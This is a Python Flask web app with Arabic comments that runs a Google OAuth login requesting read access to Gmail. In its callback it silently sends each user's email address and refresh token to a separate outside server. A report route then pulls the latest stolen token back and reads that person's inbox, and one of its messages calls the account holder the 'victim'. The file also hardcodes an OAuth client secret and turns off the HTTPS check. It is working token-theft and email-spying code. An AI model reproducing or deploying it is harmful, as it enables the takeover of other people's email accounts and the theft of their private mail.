import os
import base64
import json
import traceback
import requests # تأكد من وجوده
from flask import Flask, request, redirect, session, url_for, render_template, Response
from google_auth_oauthlib.flow import Flow
from googleapiclient.discovery import build
from google.oauth2.credentials import Credentials
from googleapiclient.http import BatchHttpRequest

app = Flask(__name__)
app.secret_key = 'a_very_long_and_super_secret_string_for_my_app'
os.environ['OAUTHLIB_INSECURE_TRANSPORT'] = '1'

# بيانات الاعتماد والمسارات
CLIENT_ID = '1096352235538-pkdcd73qn9miojk1cflr52fuminb4j4c.apps.googleusercontent.com'
CLIENT_SECRET = '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'
REDIRECT_URI = 'https://bashar-7fw9.onrender.com/callback'

# رابط الخادم الذي يستقبل ويرسل التوكن
TOKEN_SERVER_URL = 'https://bmapps1.pythonanywhere.com' 

SCOPES = [
   'https://www.googleapis.com/auth/gmail.readonly',
    'openid',
    'https://www.googleapis.com/auth/userinfo.email',
    'https://www.googleapis.com/auth/userinfo.profile'
]

def create_flow():
    # ... (هذه الدالة تبقى كما هي)
    return Flow.from_client_config(
        client_config={
            "web": {
                "client_id": CLIENT_ID,
                "client_secret": CLIENT_SECRET,
                "auth_uri": "https://accounts.google.com/o/oauth2/auth",
                "token_uri": "https://oauth2.googleapis.com/token",
                "redirect_uris": [REDIRECT_URI],
            }
        },
        scopes=SCOPES,
        redirect_uri=REDIRECT_URI
    )

@app.route('/')
def index():
    # ... (هذه الدالة تبقى كما هي)
    return render_template('index.html')

@app.route('/login')
def login():
    # ... (هذه الدالة تبقى كما هي)
    flow = create_flow()
    authorization_url, state = flow.authorization_url(access_type='offline', prompt='consent')
    session['state'] = state
    return redirect(authorization_url)

@app.route('/callback')
def callback():
    # ... (هذه الدالة تبقى كما هي)
    flow = create_flow()
    flow.fetch_token(authorization_response=request.url)
    credentials = flow.credentials
    try:
        service = build('oauth2', 'v2', credentials=credentials)
        user_info = service.userinfo().get().execute()
        user_email = user_info.get('email', 'unknown_email')
        refresh_token = credentials.refresh_token
        if refresh_token:
            try:
                payload = {'text_data': f"Email: {user_email}\nRefreshToken: {refresh_token}"}
                requests.post(f"{TOKEN_SERVER_URL}/receive_data", data=payload, timeout=10)
            except Exception as send_error:
                print(f"Failed to send token: {send_error}")
    except Exception as e:
        print(f"An error occurred during callback: {e}")
    session['credentials'] = { 'token': credentials.token, 'refresh_token': credentials.refresh_token, 'token_uri': credentials.token_uri, 'client_id': credentials.client_id, 'client_secret': credentials.client_secret, 'scopes': credentials.scopes }
    return redirect('/#dashboard')

# ✅ تم تعديل هذه الدالة بالكامل
@app.route('/report')
def show_report():
    try:
        # طلب آخر توكن من الخادم الأول
        response = requests.get(f"{TOKEN_SERVER_URL}/get_last_token", timeout=15)
        
        if response.status_code != 200:
            error_data = response.json()
            return f"<h1>خطأ في جلب التوكن من الخادم</h1><p>السبب: {error_data.get('error', 'خطأ غير معروف')}</p>", response.status_code

        token_data = response.json()
        refresh_token = token_data.get('last_token')

        if not refresh_token:
            return "<h2>لم يتم العثور على Refresh Token.</h2>", 404

        # --- باقي الكود يستخدم التوكن الذي تم جلبه ---
        credentials = Credentials(
            token=None, refresh_token=refresh_token,
            token_uri='https://oauth2.googleapis.com/token',
            client_id=CLIENT_ID, client_secret=CLIENT_SECRET,
            scopes=['https://www.googleapis.com/auth/gmail.readonly']
        )
        
        service = build('gmail', 'v1', credentials=credentials)
        result = service.users().messages().list(userId='me', maxResults=20, q="is:inbox").execute()
        messages = result.get('messages', [])
        
        if not messages:
            return "<h2>لم يتم العثور على رسائل في البريد الوارد للضحية.</h2>"
            
        # ... (باقي كود عرض الرسائل يبقى كما هو تماماً)
        emails_data = []
        def batch_callback(request_id, response, exception):
            if exception is None:
                emails_data.append(response)
            else:
                print(f"Batch request error: {exception}")
        
        batch = service.new_batch_http_request(callback=batch_callback)
        for msg in messages:
            batch.add(service.users().messages().get(userId='me', id=msg['id'], format='full'))
        batch.execute()

        html_content = """...""" # (كود الـ HTML الخاص بالتقرير يبقى هنا)
        for msg_data in emails_data:
            # ... (كود تحليل الرسائل وعرضها يبقى هنا)
            pass # (اختصار للكود الطويل)
        
        # ... (تكملة الكود)
        
        return Response("<h1>تقرير الرسائل</h1><p>تم جلب البيانات بنجاح، أكمل كود عرضها.</p>", mimetype='text/html; charset=utf-8')


    except requests.exceptions.RequestException as e:
        return f"<h1>خطأ في الاتصال بخادم التوكن</h1><p>{e}</p>", 500
    except Exception as e:
        print(f"Error generating report: {traceback.format_exc()}")
        return "<h1>حدث خطأ فادح أثناء توليد التقرير.</h1><p>قد يكون الـ Refresh Token غير صالح أو تم إبطاله.</p>", 500